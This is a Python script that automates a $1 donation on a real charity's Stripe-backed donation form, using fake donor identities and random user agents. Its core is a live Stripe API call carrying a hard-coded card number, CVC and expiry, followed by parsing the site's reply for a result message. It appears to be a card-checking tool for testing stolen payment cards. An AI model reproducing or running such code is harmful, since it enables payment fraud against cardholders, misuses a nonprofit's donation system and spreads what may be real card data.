import requests
import re
import time
from user_agent import generate_user_agent
from faker import Faker
from html import unescape

f = Faker()
email = f.email()
name = f.name()
u = generate_user_agent()
r = requests.Session()

headers = {
    'authority': 'www.unitedwaykitsap.org',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'referer': 'https://www.unitedwaykitsap.org/Donate/?form-id=101&payment-mode=stripe&level-id=custom&custom-amount=1',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': u,
}

params = {
    'form-id': '101',
    'payment-mode': 'stripe',
    'level-id': 'custom',
    'custom-amount': '1',
}

html = r.get('https://www.unitedwaykitsap.org/Donate/', params=params, cookies=r.cookies, headers=headers).text

python = re.search(r'name="give-form-hash" value="([^"]+)"', html)
py = python.group(1) if python else None

headers = {
    'authority': 'www.unitedwaykitsap.org',
    'accept': '*/*',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.unitedwaykitsap.org',
    'referer': 'https://www.unitedwaykitsap.org/Donate/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': u,
    'x-requested-with': 'XMLHttpRequest',
}

data = {
    'give-honeypot': '',
    'give-form-id-prefix': '101-1',
    'give-form-id': '101',
    'give-form-title': 'Make a gift today',
    'give-current-url': 'https://www.unitedwaykitsap.org/Donate/',
    'give-form-url': 'https://www.unitedwaykitsap.org/Donate/',
    'give-form-minimum': '1',
    'give-form-maximum': '1000000',
    'give-form-hash': py,
    'give-price-id': 'custom',
    'give-recurring-logged-in-only': '',
    'give-logged-in-only': '1',
    '_give_is_donation_recurring': '0',
    'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
    'give-amount': '1',
    'give-recurring-period-donors-choice': 'month',
    'address': 'New york 50 park',
    'give_stripe_payment_method': '',
    'payment-mode': 'stripe',
    'give_title': 'Mr.',
    'give_first': name,
    'give_last': name,
    'give_company_name': name,
    'give_email': email,
    'card_name': name,
    'give_action': 'purchase',
    'give-gateway': 'stripe',
    'action': 'give_process_donation',
    'give_ajax': 'true',
}

response = r.post('https://www.unitedwaykitsap.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)

headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': u,
}

data = f'type=card&billing_details[name]={name}+{name}&billing_details[email]={email}&card[number]=4100390667086181&card[cvc]=436&card[exp_month]=09&card[exp_year]=26&payment_user_agent=stripe.js%2F1e42d46cc8%3B+stripe-js-v3%2F1e42d46cc8%3B+split-card-element&key=pk_live_tL7CLPLhwWj0ufyKvozklYDB'

response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

sync = response.json()
xp = sync['id']

headers = {
    'authority': 'www.unitedwaykitsap.org',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.unitedwaykitsap.org',
    'referer': 'https://www.unitedwaykitsap.org/Donate/?form-id=101&payment-mode=stripe&level-id=custom&custom-amount=1',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': u,
}

params = {
    'payment-mode': 'stripe',
    'form-id': '101',
}

data = {
    'give-honeypot': '',
    'give-form-id-prefix': '101-1',
    'give-form-id': '101',
    'give-form-title': 'Make a gift today',
    'give-current-url': 'https://www.unitedwaykitsap.org/Donate/',
    'give-form-url': 'https://www.unitedwaykitsap.org/Donate/',
    'give-form-minimum': '1',
    'give-form-maximum': '1000000',
    'give-form-hash': py,
    'give-price-id': 'custom',
    'give-recurring-logged-in-only': '',
    'give-logged-in-only': '1',
    '_give_is_donation_recurring': '0',
    'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
    'give-amount': '1',
    'give-recurring-period-donors-choice': 'month',
    'address': 'New york 50 park',
    'give_stripe_payment_method': xp,
    'payment-mode': 'stripe',
    'give_title': 'Mr.',
    'give_first': name,
    'give_last': name,
    'give_company_name': name,
    'give_email': email,
    'card_name': name,
    'give_action': 'purchase',
    'give-gateway': 'stripe',
}

response = r.post('https://www.unitedwaykitsap.org/Donate/', params=params, cookies=r.cookies, headers=headers, data=data).text

xxp = re.search(r'<div[^>]*class="[^"]*give_notices[^"]*"[^>]*>(.*?)</div>\s*</div>', response, re.DOTALL)
if xxp:
    xxxp = re.sub(r'<[^>]+>', '', xxp.group(0))
    xxxp = unescape(xxxp).strip()
    print(xxxp)
else:
    xxxxp = re.search(r'Error:\s*([^<]+)', response)
    if xxxxp:
        print(xxxxp.group(1).strip())
    else:
        print("No error message found")